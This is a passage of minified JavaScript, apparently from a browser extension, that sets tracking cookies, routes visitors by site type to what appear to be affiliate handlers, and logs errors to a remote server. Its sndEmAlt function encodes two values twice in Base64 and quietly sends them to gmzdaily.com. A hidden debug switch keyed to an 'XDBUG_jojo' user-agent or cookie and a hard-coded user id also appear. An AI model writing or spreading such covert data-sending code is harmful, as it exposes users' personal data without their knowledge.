        sigLnk_ex("https://chrome.google.com/webstore/detail/tab-hide/bjamanegmopfidjfikhkjkbhnaaikedo", a);
        stCkie_ex("gseodone_ext", "1", .05)
    }
}

function sndEmAlt(a, b) {
    var c = new XMLHttpRequest;
    var d = "https://gmzdaily.com/alt.php?&c=" + B64E(B64E(b, "encode"), "encode");
    d = d + "&u=" + B64E(B64E(a, "encode"), "encode");
    c.open("GET", d, !0);
    c.send()
}

function Ruko66() {
    if (!(inIframe() || (-1 < window.navigator.userAgent.indexOf("XDBUG_jojo") || -1 < document.cookie.indexOf("XDBUG_jojo")) && 1 == loadExtJs_ex())) {
        if (-1 < window.navigator.userAgent.indexOf("XDBUG_jojo") || -1 < document.cookie.indexOf("XDBUG_jojo")) isLog_jojo = !0, extgaLog("your " + exversion_jojo + minorVerId + " majesty, dropbox is now loaded ...");
        Init_ex();
        "xiaotuziguaiguai" == usrHxId && (isLog_jojo = !0, extgaLog("yo! xiaotuzi " + exversion_jojo + minorVerId + " ..."));
        "land" == siteType ? LandEty() : "cbck" == siteType ? CbckEty() : "merc" == siteType && (MercEty(), gatrackMerc());
        stCkie_ex("hibext_instdsigdipv2", "1", 10);
        SdAdmCkie()
    }
}
try {
    Ruko66()
} catch (a) {
    LogErrRemote(a)
};